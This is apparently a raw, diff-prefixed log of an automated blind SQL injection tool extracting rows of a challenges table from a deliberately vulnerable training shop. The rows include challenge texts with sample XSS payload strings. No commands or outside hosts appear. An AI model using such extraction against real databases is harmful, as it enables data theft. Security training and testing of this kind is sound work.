+[12:00:53] [INFO] retrieved: 30
+[12:00:53] [INFO] retrieved: ______________________________
+[12:00:53] [INFO] retrieved: 
+[12:00:57] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:00:57] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:00:57] [INFO] retrieving the length of query output
+
+[12:00:57] [INFO] retrieved: 42
+[12:00:57] [INFO] retrieved: __________________________________
+[12:00:57] [INFO] retrieved: 
+[12:01:01] [INFO] retrieved: .. Christmas special offer of 2014.             
+[12:01:01] [INFO] retrieved: Order the Christmas special offer of 2014.
+[12:01:01] [INFO] retrieving the length of query output
+
+[12:01:01] [INFO] retrieved: 1
+
+[12:01:01] [INFO] retrieved: 4
+[12:01:01] [INFO] retrieving the length of query output
+
+[12:01:01] [INFO] retrieved:  
+
+[12:01:02] [INFO] retrieved:  
+[12:01:02] [INFO] retrieving the length of query output
+
+[12:01:02] [INFO] retrieved: 1
+
+[12:01:02] [INFO] retrieved: 0
+[12:01:02] [INFO] retrieving the length of query output
+
+[12:01:02] [INFO] retrieved: 2
+[12:01:02] [INFO] retrieved: __
+[12:01:02] [INFO] retrieved: 
+[12:01:02] [INFO] retrieved: 15           
+[12:01:02] [INFO] retrieved: 15
+[12:01:02] [INFO] retrieving the length of query output
+
+[12:01:02] [INFO] retrieved: 25
+[12:01:03] [INFO] retrieved: _________________________
+[12:01:03] [INFO] retrieved: 
+[12:01:05] [INFO] retrieved: christmasSpecialChallenge             
+[12:01:05] [INFO] retrieved: christmasSpecialChallenge
+[12:01:05] [INFO] retrieving the length of query output
+
+[12:01:05] [INFO] retrieved: 88
+[12:01:05] [INFO] retrieved: __________________________________
+[12:01:05] [INFO] retrieved: 
+[12:01:15] [INFO] retrieved: ..ction_Prevention_Cheat_Sheet.html             
+[12:01:15] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+[12:01:15] [INFO] retrieving the length of query output
+
+[12:01:15] [INFO] retrieved: 17
+[12:01:15] [INFO] retrieved: _________________
+[12:01:15] [INFO] retrieved: 
+[12:01:17] [INFO] retrieved: Christmas Special             
+[12:01:17] [INFO] retrieved: Christmas Special
+[12:01:17] [INFO] retrieving the length of query output
+
+[12:01:17] [INFO] retrieved: 1
+
+[12:01:17] [INFO] retrieved: 0
+[12:01:17] [INFO] retrieving the length of query output
+
+[12:01:17] [INFO] retrieved:  
+
+[12:01:17] [INFO] retrieved:  
+[12:01:17] [INFO] retrieving the length of query output
+
+[12:01:17] [INFO] retrieved:  
+
+[12:01:17] [INFO] retrieved:  
+[12:01:18] [INFO] retrieving the length of query output
+
+[12:01:18] [INFO] retrieved: 30
+[12:01:18] [INFO] retrieved: ______________________________
+[12:01:18] [INFO] retrieved: 
+[12:01:21] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:01:21] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:01:21] [INFO] retrieving the length of query output
+
+[12:01:21] [INFO] retrieved: 3
+[12:01:21] [INFO] retrieved: ___
+[12:01:21] [INFO] retrieved: 
+[12:01:21] [INFO] retrieved: XSS           
+[12:01:22] [INFO] retrieved: XSS
+[12:01:22] [INFO] retrieving the length of query output
+
+[12:01:22] [INFO] retrieved: 1
+
+[12:01:22] [INFO] retrieved: 0
+[12:01:22] [INFO] retrieving the length of query output
+
+[12:01:22] [INFO] retrieved: 30
+[12:01:22] [INFO] retrieved: ______________________________
+[12:01:22] [INFO] retrieved: 
+[12:01:28] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:01:28] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:01:28] [INFO] retrieving the length of query output
+
+[12:01:28] [INFO] retrieved: 238
+[12:01:28] [INFO] retrieved: __________________________________
+[12:01:28] [INFO] retrieved: 
+[12:01:53] [INFO] retrieved: ..harmful</strong> on Docker!)</em>               
+[12:01:53] [INFO] retrieved: Bypass the Content Security Policy and perform an XSS attack with <code>&lt;script&gt;alert(`xss`)&lt;/script&gt;</code> on a legacy page within the application. <em>(This challenge is <strong>potentially harmful</strong> on Docker!)</em>
+[12:01:53] [INFO] retrieving the length of query output
+
+[12:01:53] [INFO] retrieved: 1
+
+[12:01:53] [INFO] retrieved: 4
+[12:01:53] [INFO] retrieving the length of query output
+
+[12:01:53] [INFO] retrieved: 6
+[12:01:53] [INFO] retrieved: ______
+[12:01:53] [INFO] retrieved: 
+[12:01:54] [INFO] retrieved: Docker           
+[12:01:54] [INFO] retrieved: Docker
+[12:01:54] [INFO] retrieving the length of query output
+
+[12:01:54] [INFO] retrieved: 1
+
+[12:01:54] [INFO] retrieved: 0
+[12:01:54] [INFO] retrieving the length of query output
+
+[12:01:54] [INFO] retrieved: 2
+[12:01:54] [INFO] retrieved: __
+[12:01:54] [INFO] retrieved: 
+[12:01:54] [INFO] retrieved: 16           
+[12:01:54] [INFO] retrieved: 16
+[12:01:55] [INFO] retrieving the length of query output
+
+[12:01:54] [INFO] retrieved: 20
+[12:01:55] [INFO] retrieved: ____________________
+[12:01:55] [INFO] retrieved: 
+[12:01:57] [INFO] retrieved: usernameXssChallenge             
+[12:01:57] [INFO] retrieved: usernameXssChallenge
+[12:01:57] [INFO] retrieving the length of query output
+
+[12:01:57] [INFO] retrieved: 95
+[12:01:57] [INFO] retrieved: __________________________________
+[12:01:57] [INFO] retrieved: 
+[12:02:09] [INFO] retrieved: ..pting_Prevention_Cheat_Sheet.html             
+[12:02:09] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+[12:02:09] [INFO] retrieving the length of query output
+
+[12:02:09] [INFO] retrieved: 10
+[12:02:09] [INFO] retrieved: __________
+[12:02:09] [INFO] retrieved: 
+[12:02:11] [INFO] retrieved: CSP Bypass             
+[12:02:11] [INFO] retrieved: CSP Bypass
+[12:02:11] [INFO] retrieving the length of query output
+
+[12:02:11] [INFO] retrieved: 1
+
+[12:02:11] [INFO] retrieved: 0
+[12:02:11] [INFO] retrieving the length of query output
+
+[12:02:11] [INFO] retrieved: 11
+[12:02:11] [INFO] retrieved: ___________
+[12:02:11] [INFO] retrieved: 
+[12:02:12] [INFO] retrieved: Danger Zone             
+[12:02:12] [INFO] retrieved: Danger Zone
+[12:02:12] [INFO] retrieving the length of query output
+
+[12:02:12] [INFO] retrieved:  
+
+[12:02:12] [INFO] retrieved:  
+[12:02:12] [INFO] retrieving the length of query output
+
+[12:02:12] [INFO] retrieved: 30
+[12:02:13] [INFO] retrieved: ______________________________
+[12:02:13] [INFO] retrieved: 
+[12:02:16] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:02:16] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:02:16] [INFO] retrieving the length of query output
+
+[12:02:16] [INFO] retrieved: 3
+[12:02:17] [INFO] retrieved: ___
+[12:02:17] [INFO] retrieved: 
+[12:02:17] [INFO] retrieved: XSS           
+[12:02:17] [INFO] retrieved: XSS
+[12:02:17] [INFO] retrieving the length of query output
+
+[12:02:17] [INFO] retrieved: 1
+
+[12:02:17] [INFO] retrieved: 0
+[12:02:17] [INFO] retrieving the length of query output
+
+[12:02:17] [INFO] retrieved: 30
+[12:02:17] [INFO] retrieved: ______________________________
+[12:02:17] [INFO] retrieved: 
+[12:02:21] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:02:21] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:02:21] [INFO] retrieving the length of query output
+
+[12:02:21] [INFO] retrieved: 228
+[12:02:21] [INFO] retrieved: __________________________________
+[12:02:21] [INFO] retrieved: 
+[12:02:48] [INFO] retrieved: ..harmful</strong> on Docker!)</em>               
+[12:02:48] [INFO] retrieved: Perform a <i>persisted</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code> bypassing a <i>client-side</i> security mechanism. <em>(This challenge is <strong>potentially harmful</strong> on Docker!)</em>
+[12:02:48] [INFO] retrieving the length of query output
+
+[12:02:48] [INFO] retrieved: 1
+
+[12:02:48] [INFO] retrieved: 3
+[12:02:48] [INFO] retrieving the length of query output
+
+[12:02:48] [INFO] retrieved: 6
+[12:02:48] [INFO] retrieved: ______
+[12:02:48] [INFO] retrieved: 
+[12:02:49] [INFO] retrieved: Docker           
+[12:02:49] [INFO] retrieved: Docker
+[12:02:49] [INFO] retrieving the length of query output
+
+[12:02:49] [INFO] retrieved: 1
+
+[12:02:49] [INFO] retrieved: 0
+[12:02:49] [INFO] retrieving the length of query output
+
+[12:02:49] [INFO] retrieved: 2
+[12:02:49] [INFO] retrieved: __
+[12:02:49] [INFO] retrieved: 
+[12:02:49] [INFO] retrieved: 17           
+[12:02:50] [INFO] retrieved: 17
+[12:02:50] [INFO] retrieving the length of query output
+
+[12:02:50] [INFO] retrieved: 25
+[12:02:50] [INFO] retrieved: _________________________
+[12:02:50] [INFO] retrieved: 
+[12:02:52] [INFO] retrieved: persistedXssUserChallenge             
+[12:02:52] [INFO] retrieved: persistedXssUserChallenge
+[12:02:52] [INFO] retrieving the length of query output
+
+[12:02:52] [INFO] retrieved: 95
+[12:02:52] [INFO] retrieved: __________________________________
+[12:02:52] [INFO] retrieved: 
+[12:03:02] [INFO] retrieved: ..pting_Prevention_Cheat_Sheet.html             
+[12:03:02] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
+[12:03:02] [INFO] retrieving the length of query output
+
+[12:03:02] [INFO] retrieved: 26
+[12:03:02] [INFO] retrieved: __________________________
+[12:03:02] [INFO] retrieved: 
+[12:03:05] [INFO] retrieved: Client-side XSS Protection             
+[12:03:05] [INFO] retrieved: Client-side XSS Protection
+[12:03:05] [INFO] retrieving the length of query output
+
+[12:03:05] [INFO] retrieved: 1
+
+[12:03:05] [INFO] retrieved: 0
+[12:03:05] [INFO] retrieving the length of query output
+
+[12:03:05] [INFO] retrieved: 11
+[12:03:05] [INFO] retrieved: ___________
+[12:03:05] [INFO] retrieved: 
+[12:03:06] [INFO] retrieved: Danger Zone             
+[12:03:06] [INFO] retrieved: Danger Zone
+[12:03:06] [INFO] retrieving the length of query output
+
+[12:03:06] [INFO] retrieved:  
+
+[12:03:06] [INFO] retrieved:  
+[12:03:07] [INFO] retrieving the length of query output
+
+[12:03:07] [INFO] retrieved: 30
+[12:03:07] [INFO] retrieved: ______________________________
+[12:03:07] [INFO] retrieved: 
+[12:03:10] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:03:10] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:03:10] [INFO] retrieving the length of query output
+
+[12:03:10] [INFO] retrieved: 23
+[12:03:10] [INFO] retrieved: _______________________
+[12:03:10] [INFO] retrieved: 
+[12:03:16] [INFO] retrieved: Sensitive Data Exposure             
+[12:03:16] [INFO] retrieved: Sensitive Data Exposure
+[12:03:16] [INFO] retrieving the length of query output
+
+[12:03:16] [INFO] retrieved: 1
+
+[12:03:17] [INFO] retrieved: 0
+[12:03:17] [INFO] retrieving the length of query output
+
+[12:03:17] [INFO] retrieved: 30
+[12:03:17] [INFO] retrieved: ______________________________
+[12:03:17] [INFO] retrieved: 
+[12:03:20] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:03:20] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:03:20] [INFO] retrieving the length of query output
+
+[12:03:20] [INFO] retrieved: 31
+[12:03:20] [INFO] retrieved: _______________________________
+[12:03:20] [INFO] retrieved: 
+[12:03:24] [INFO] retrieved: Access a confidential document.             
+[12:03:24] [INFO] retrieved: Access a confidential document.
+[12:03:24] [INFO] retrieving the length of query output
+
+[12:03:24] [INFO] retrieved: 1
+
+[12:03:24] [INFO] retrieved: 1
+[12:03:24] [INFO] retrieving the length of query output
+
+[12:03:24] [INFO] retrieved:  
+
+[12:03:24] [INFO] retrieved:  
+[12:03:24] [INFO] retrieving the length of query output
+
+[12:03:24] [INFO] retrieved: 1
+
+[12:03:24] [INFO] retrieved: 1
+[12:03:24] [INFO] retrieving the length of query output
+
+[12:03:24] [INFO] retrieved: 2
+[12:03:24] [INFO] retrieved: __
+[12:03:24] [INFO] retrieved: 
+[12:03:25] [INFO] retrieved: 18           
+[12:03:25] [INFO] retrieved: 18
+[12:03:25] [INFO] retrieving the length of query output
+
+[12:03:25] [INFO] retrieved: 25
+[12:03:25] [INFO] retrieved: _________________________
+[12:03:25] [INFO] retrieved: 
+[12:03:27] [INFO] retrieved: directoryListingChallenge             
+[12:03:27] [INFO] retrieved: directoryListingChallenge
+[12:03:27] [INFO] retrieving the length of query output
+
+[12:03:27] [INFO] retrieved:  
+
+[12:03:27] [INFO] retrieved:  
+[12:03:28] [INFO] retrieving the length of query output
+
+[12:03:28] [INFO] retrieved: 21
+[12:03:28] [INFO] retrieved: _____________________
+[12:03:28] [INFO] retrieved: 
+[12:03:30] [INFO] retrieved: Confidential Document             
+[12:03:30] [INFO] retrieved: Confidential Document
+[12:03:30] [INFO] retrieving the length of query output
+
+[12:03:30] [INFO] retrieved: 1
+
+[12:03:30] [INFO] retrieved: 1
+[12:03:30] [INFO] retrieving the length of query output
+
+[12:03:30] [INFO] retrieved: 36
+[12:03:30] [INFO] retrieved: __________________________________
+[12:03:30] [INFO] retrieved: 
+[12:03:34] [INFO] retrieved: ..d for Demos,With Coding Challenge             
+[12:03:34] [INFO] retrieved: Good for Demos,With Coding Challenge
+[12:03:34] [INFO] retrieving the length of query output
+
+[12:03:34] [INFO] retrieved:  
+
+[12:03:34] [INFO] retrieved:  
+[12:03:34] [INFO] retrieving the length of query output
+
+[12:03:34] [INFO] retrieved: 30
+[12:03:34] [INFO] retrieved: ______________________________
+[12:03:34] [INFO] retrieved: 
+[12:03:38] [INFO] retrieved: 2026-05-08 08:45:15.511 +00:00             
+[12:03:38] [INFO] retrieved: 2026-05-08 08:45:15.511 +00:00
+[12:03:38] [INFO] retrieving the length of query output
+
+[12:03:38] [INFO] retrieved: 3
+[12:03:38] [INFO] retrieved: ___
+[12:03:38] [INFO] retrieved: 
+[12:03:38] [INFO] retrieved: XSS           
+[12:03:38] [INFO] retrieved: XSS
+[12:03:38] [INFO] retrieving the length of query output
+
+[12:03:38] [INFO] retrieved: 1
+
+[12:03:38] [INFO] retrieved: 0
+[12:03:39] [INFO] retrieving the length of query output
+
+[12:03:39] [INFO] retrieved: 30
+[12:03:39] [INFO] retrieved: ______________________________
+[12:03:39] [INFO] retrieved: 
+[12:03:42] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:03:42] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:03:42] [INFO] retrieving the length of query output
+
+[12:03:42] [INFO] retrieved: 95
+[12:03:43] [INFO] retrieved: __________________________________
+[12:03:43] [INFO] retrieved: 
+[12:03:56] [INFO] retrieved: ..ascript:alert(`xss`)"&gt;</code>.             
+[12:03:56] [INFO] retrieved: Perform a <i>DOM</i> XSS attack with <code>&lt;iframe src="javascript:alert(`xss`)"&gt;</code>.
+[12:03:56] [INFO] retrieving the length of query output
+
+[12:03:56] [INFO] retrieved: 1
+
+[12:03:56] [INFO] retrieved: 1
+[12:03:56] [INFO] retrieving the length of query output
+
+[12:03:56] [INFO] retrieved:  
+
+[12:03:56] [INFO] retrieved:  
+[12:03:57] [INFO] retrieving the length of query output
+
+[12:03:57] [INFO] retrieved: 1
+
+[12:03:57] [INFO] retrieved: 1
+[12:03:57] [INFO] retrieving the length of query output
+
+[12:03:57] [INFO] retrieved: 2
+[12:03:57] [INFO] retrieved: __
+[12:03:57] [INFO] retrieved: 
+[12:03:57] [INFO] retrieved: 19           
+[12:03:57] [INFO] retrieved: 19
+[12:03:57] [INFO] retrieving the length of query output
+
+[12:03:57] [INFO] retrieved: 17
+[12:03:57] [INFO] retrieved: _________________
+[12:03:57] [INFO] retrieved: 
+[12:03:59] [INFO] retrieved: localXssChallenge             
+[12:03:59] [INFO] retrieved: localXssChallenge
+[12:03:59] [INFO] retrieving the length of query output
+
+[12:03:59] [INFO] retrieved: 88
+[12:04:00] [INFO] retrieved: __________________________________
+[12:04:00] [INFO] retrieved: 
+[12:04:10] [INFO] retrieved: ..d_XSS_Prevention_Cheat_Sheet.html             
+[12:04:10] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
+[12:04:10] [INFO] retrieving the length of query output
+
+[12:04:10] [INFO] retrieved: 7
+[12:04:10] [INFO] retrieved: _______
+[12:04:10] [INFO] retrieved: 
+[12:04:10] [INFO] retrieved: DOM XSS           
+[12:04:11] [INFO] retrieved: DOM XSS
+[12:04:11] [INFO] retrieving the length of query output
+
+[12:04:11] [INFO] retrieved: 1
+
+[12:04:11] [INFO] retrieved: 0
+[12:04:11] [INFO] retrieving the length of query output
+
+[12:04:11] [INFO] retrieved: 45
+[12:04:11] [INFO] retrieved: __________________________________
+[12:04:11] [INFO] retrieved: 
+[12:04:17] [INFO] retrieved: ..d for Demos,With Coding Challenge             
+[12:04:17] [INFO] retrieved: Tutorial,Good for Demos,With Coding Challenge
+[12:04:17] [INFO] retrieving the length of query output
+
+[12:04:17] [INFO] retrieved: 1
+
+[12:04:17] [INFO] retrieved: 2
+[12:04:17] [INFO] retrieving the length of query output
+
+[12:04:17] [INFO] retrieved: 30
+[12:04:17] [INFO] retrieved: ______________________________
+[12:04:17] [INFO] retrieved: 
+[12:04:20] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:04:20] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:04:20] [INFO] retrieving the length of query output
+
+[12:04:20] [INFO] retrieved: 9
+[12:04:21] [INFO] retrieved: _________
+[12:04:21] [INFO] retrieved: 
+[12:04:22] [INFO] retrieved: Injection           
+[12:04:24] [INFO] retrieved: Injection
+[12:04:24] [INFO] retrieving the length of query output
+
+[12:04:24] [INFO] retrieved: 1
+
+[12:04:25] [INFO] retrieved: 0
+[12:04:25] [INFO] retrieving the length of query output
+
+[12:04:25] [INFO] retrieved: 30
+[12:04:25] [INFO] retrieved: ______________________________
+[12:04:25] [INFO] retrieved: 
+[12:04:28] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:04:28] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:04:28] [INFO] retrieving the length of query output
+
+[12:04:28] [INFO] retrieved: 61
+[12:04:29] [INFO] retrieved: __________________________________
+[12:04:29] [INFO] retrieved: 
+[12:04:35] [INFO] retrieved: ..ema definition via SQL Injection.             
+[12:04:35] [INFO] retrieved: Exfiltrate the entire DB schema definition via SQL Injection.
+[12:04:35] [INFO] retrieving the length of query output
+
+[12:04:35] [INFO] retrieved: 1
+
+[12:04:35] [INFO] retrieved: 3
+[12:04:35] [INFO] retrieving the length of query output
+
+[12:04:35] [INFO] retrieved:  
+
+[12:04:35] [INFO] retrieved:  
+[12:04:36] [INFO] retrieving the length of query output
+
+[12:04:36] [INFO] retrieved: 1
+
+[12:04:36] [INFO] retrieved: 1
+[12:04:36] [INFO] retrieving the length of query output
+
+[12:04:36] [INFO] retrieved: 2
+[12:04:36] [INFO] retrieved: __
+[12:04:36] [INFO] retrieved: 
+[12:04:36] [INFO] retrieved: 20           
+[12:04:36] [INFO] retrieved: 20
+[12:04:36] [INFO] retrieving the length of query output
+
+[12:04:36] [INFO] retrieved: 17
+[12:04:36] [INFO] retrieved: _________________
+[12:04:36] [INFO] retrieved: 
+[12:04:38] [INFO] retrieved: dbSchemaChallenge             
+[12:04:38] [INFO] retrieved: dbSchemaChallenge
+[12:04:38] [INFO] retrieving the length of query output
+
+[12:04:38] [INFO] retrieved: 88
+[12:04:38] [INFO] retrieved: __________________________________
+[12:04:38] [INFO] retrieved: 
+[12:04:47] [INFO] retrieved: ..ction_Prevention_Cheat_Sheet.html             
+[12:04:48] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+[12:04:48] [INFO] retrieving the length of query output
+
+[12:04:48] [INFO] retrieved: 15
+[12:04:48] [INFO] retrieved: _______________
+[12:04:48] [INFO] retrieved: 
+[12:04:49] [INFO] retrieved: Database Schema             
+[12:04:49] [INFO] retrieved: Database Schema
+[12:04:49] [INFO] retrieving the length of query output
+
+[12:04:49] [INFO] retrieved: 1
+
+[12:04:49] [INFO] retrieved: 0
+[12:04:50] [INFO] retrieving the length of query output
+
+[12:04:50] [INFO] retrieved: 21
+[12:04:50] [INFO] retrieved: _____________________
+[12:04:50] [INFO] retrieved: 
+[12:04:52] [INFO] retrieved: With Coding Challenge             
+[12:04:52] [INFO] retrieved: With Coding Challenge
+[12:04:52] [INFO] retrieving the length of query output
+
+[12:04:52] [INFO] retrieved:  
+
+[12:04:52] [INFO] retrieved:  
+[12:04:52] [INFO] retrieving the length of query output
+
+[12:04:52] [INFO] retrieved: 30
+[12:04:52] [INFO] retrieved: ______________________________
+[12:04:52] [INFO] retrieved: 
+[12:04:56] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00             
+[12:04:56] [INFO] retrieved: 2026-05-08 08:29:59.465 +00:00
+[12:04:56] [INFO] retrieving the length of query output
+
+[12:04:56] [INFO] retrieved: 25
+[12:04:56] [INFO] retrieved: _________________________
+[12:04:56] [INFO] retrieved: 
+[12:05:02] [INFO] retrieved: Security Misconfiguration             
+[12:05:02] [INFO] retrieved: Security Misconfiguration
+[12:05:02] [INFO] retrieving the length of query output
+
+[12:05:02] [INFO] retrieved: 1
+
+[12:05:02] [INFO] retrieved: 0
+[12:05:02] [INFO] retrieving the length of query output
+
+[12:05:02] [INFO] retrieved: 30
+[12:05:02] [INFO] retrieved: ______________________________
+[12:05:02] [INFO] retrieved: 
+[12:05:06] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:05:06] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:05:06] [INFO] retrieving the length of query output
+
+[12:05:06] [INFO] retrieved: 63
+[12:05:06] [INFO] retrieved: __________________________________
+[12:05:06] [INFO] retrieved: 
+[12:05:12] [INFO] retrieved: .. that was not properly shut down.             
+[12:05:12] [INFO] retrieved: Use a deprecated B2B interface that was not properly shut down.
+[12:05:12] [INFO] retrieving the length of query output
+
+[12:05:12] [INFO] retrieved: 1
+
+[12:05:12] [INFO] retrieved: 2
+[12:05:13] [INFO] retrieving the length of query output
+
+[12:05:13] [INFO] retrieved:  
+
+[12:05:13] [INFO] retrieved:  
+[12:05:13] [INFO] retrieving the length of query output
+
+[12:05:13] [INFO] retrieved: 1
+
+[12:05:13] [INFO] retrieved: 0
+[12:05:13] [INFO] retrieving the length of query output
+
+[12:05:13] [INFO] retrieved: 2
+[12:05:13] [INFO] retrieved: __
+[12:05:13] [INFO] retrieved: 
+[12:05:14] [INFO] retrieved: 21           
+[12:05:14] [INFO] retrieved: 21
+[12:05:14] [INFO] retrieving the length of query output
+
+[12:05:14] [INFO] retrieved: 28
+[12:05:14] [INFO] retrieved: ____________________________
+[12:05:14] [INFO] retrieved: 
+[12:05:17] [INFO] retrieved: deprecatedInterfaceChallenge             
+[12:05:17] [INFO] retrieved: deprecatedInterfaceChallenge
+[12:05:17] [INFO] retrieving the length of query output
+
+[12:05:17] [INFO] retrieved: 84
+[12:05:17] [INFO] retrieved: __________________________________
+[12:05:17] [INFO] retrieved: 
+[12:05:26] [INFO] retrieved: ..Service_Security_Cheat_Sheet.html             
+[12:05:26] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Web_Service_Security_Cheat_Sheet.html
+[12:05:26] [INFO] retrieving the length of query output
+
+[12:05:26] [INFO] retrieved: 20
+[12:05:26] [INFO] retrieved: ____________________
+[12:05:26] [INFO] retrieved: 
+[12:05:28] [INFO] retrieved: Deprecated Interface             
+[12:05:28] [INFO] retrieved: Deprecated Interface
+[12:05:28] [INFO] retrieving the length of query output
+
+[12:05:28] [INFO] retrieved: 1
+
+[12:05:28] [INFO] retrieved: 0
+[12:05:28] [INFO] retrieving the length of query output
+
+[12:05:28] [INFO] retrieved: 24
+[12:05:28] [INFO] retrieved: ________________________
+[12:05:28] [INFO] retrieved: 
+[12:05:31] [INFO] retrieved: Contraption,Prerequisite             
+[12:05:31] [INFO] retrieved: Contraption,Prerequisite
+[12:05:31] [INFO] retrieving the length of query output
+
+[12:05:31] [INFO] retrieved:  
+
+[12:05:31] [INFO] retrieved:  
+[12:05:31] [INFO] retrieving the length of query output
+
+[12:05:31] [INFO] retrieved: 30
+[12:05:31] [INFO] retrieved: ______________________________
+[12:05:31] [INFO] retrieved: 
+[12:05:37] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:05:37] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:05:37] [INFO] retrieving the length of query output
+
+[12:05:37] [INFO] retrieved: 21
+[12:05:37] [INFO] retrieved: _____________________
+[12:05:37] [INFO] retrieved: 
+[12:05:40] [INFO] retrieved: Broken Access Control             
+[12:05:40] [INFO] retrieved: Broken Access Control
+[12:05:40] [INFO] retrieving the length of query output
+
+[12:05:40] [INFO] retrieved: 1
+
+[12:05:40] [INFO] retrieved: 0
+[12:05:40] [INFO] retrieving the length of query output
+
+[12:05:40] [INFO] retrieved: 30
+[12:05:40] [INFO] retrieved: ______________________________
+[12:05:40] [INFO] retrieved: 
+[12:05:43] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:05:43] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:05:43] [INFO] retrieving the length of query output
+
+[12:05:43] [INFO] retrieved: 106
+[12:05:44] [INFO] retrieved: __________________________________
+[12:05:44] [INFO] retrieved: 
+[12:05:55] [INFO] retrieved: .." target="_blank">easter egg</a>.               
+[12:05:55] [INFO] retrieved: Find the hidden <a href="https://en.wikipedia.org/wiki/Easter_egg_(media)" target="_blank">easter egg</a>.
+[12:05:55] [INFO] retrieving the length of query output
+
+[12:05:55] [INFO] retrieved: 1
+
+[12:05:55] [INFO] retrieved: 4
+[12:05:55] [INFO] retrieving the length of query output
+
+[12:05:55] [INFO] retrieved:  
+
+[12:05:55] [INFO] retrieved:  
+[12:05:55] [INFO] retrieving the length of query output
+
+[12:05:55] [INFO] retrieved: 1
+
+[12:05:56] [INFO] retrieved: 0
+[12:05:56] [INFO] retrieving the length of query output
+
+[12:05:56] [INFO] retrieved: 2
+[12:05:56] [INFO] retrieved: __
+[12:05:56] [INFO] retrieved: 
+[12:05:56] [INFO] retrieved: 22           
+[12:05:56] [INFO] retrieved: 22
+[12:05:56] [INFO] retrieving the length of query output
+
+[12:05:56] [INFO] retrieved: 26
+[12:05:56] [INFO] retrieved: __________________________
+[12:05:56] [INFO] retrieved: 
+[12:05:59] [INFO] retrieved: easterEggLevelOneChallenge             
+[12:05:59] [INFO] retrieved: easterEggLevelOneChallenge
+[12:05:59] [INFO] retrieving the length of query output
+
+[12:05:59] [INFO] retrieved:  
+
+[12:05:59] [INFO] retrieved:  
+[12:05:59] [INFO] retrieving the length of query output
+
+[12:05:59] [INFO] retrieved: 10
+[12:06:00] [INFO] retrieved: __________
+[12:06:00] [INFO] retrieved: 
+[12:06:01] [INFO] retrieved: Easter Egg             
+[12:06:01] [INFO] retrieved: Easter Egg
+[12:06:01] [INFO] retrieving the length of query output
+
+[12:06:01] [INFO] retrieved: 1
+
+[12:06:01] [INFO] retrieved: 0
+[12:06:01] [INFO] retrieving the length of query output
+
+[12:06:01] [INFO] retrieved: 38
+[12:06:01] [INFO] retrieved: __________________________________
+[12:06:01] [INFO] retrieved: 
+[12:06:05] [INFO] retrieved: ..nigans,Contraption,Good for Demos             
+[12:06:05] [INFO] retrieved: Shenanigans,Contraption,Good for Demos
+[12:06:05] [INFO] retrieving the length of query output
+
+[12:06:05] [INFO] retrieved:  
+
+[12:06:05] [INFO] retrieved:  
+[12:06:05] [INFO] retrieving the length of query output
+
+[12:06:05] [INFO] retrieved: 30
+[12:06:05] [INFO] retrieved: ______________________________
+[12:06:05] [INFO] retrieved: 
+[12:06:09] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:06:09] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:06:09] [INFO] retrieving the length of query output
+
+[12:06:09] [INFO] retrieved: 23
+[12:06:09] [INFO] retrieved: _______________________
+[12:06:09] [INFO] retrieved: 
+[12:06:12] [INFO] retrieved: Sensitive Data Exposure             
+[12:06:12] [INFO] retrieved: Sensitive Data Exposure
+[12:06:12] [INFO] retrieving the length of query output
+
+[12:06:12] [INFO] retrieved: 1
+
+[12:06:12] [INFO] retrieved: 0
+[12:06:12] [INFO] retrieving the length of query output
+
+[12:06:12] [INFO] retrieved: 30
+[12:06:12] [INFO] retrieved: ______________________________
+[12:06:12] [INFO] retrieved: 
+[12:06:16] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:06:16] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:06:16] [INFO] retrieving the length of query output
+
+[12:06:16] [INFO] retrieved: 74
+[12:06:16] [INFO] retrieved: __________________________________
+[12:06:16] [INFO] retrieved: 
+[12:06:23] [INFO] retrieved: ..e by accessing data cross-domain.             
+[12:06:23] [INFO] retrieved: Perform an unwanted information disclosure by accessing data cross-domain.
+[12:06:23] [INFO] retrieving the length of query output
+
+[12:06:23] [INFO] retrieved: 1
+
+[12:06:23] [INFO] retrieved: 5
+[12:06:28] [INFO] retrieving the length of query output
+
+[12:06:28] [INFO] retrieved:  
+
